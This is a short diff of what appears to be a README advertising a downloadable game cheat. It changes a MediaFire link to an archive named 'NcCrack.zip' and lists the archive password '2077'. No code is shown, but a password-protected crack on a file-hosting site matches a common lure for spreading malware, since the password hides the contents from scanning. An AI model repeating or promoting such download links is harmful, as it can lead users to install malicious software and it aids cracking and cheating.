@@ -2,7 +2,7 @@
 
 # Download cheat
 
-|[Download](https://www.mediafire.com/file/nljvo2wkslmhdsq/NcCrack.zip/file)|
+|[Download](https://www.mediafire.com/file/5n49100pwy2tiog/NcCrack.zip/file)|
 |:-------------|
 Passwrod: `2077`
 
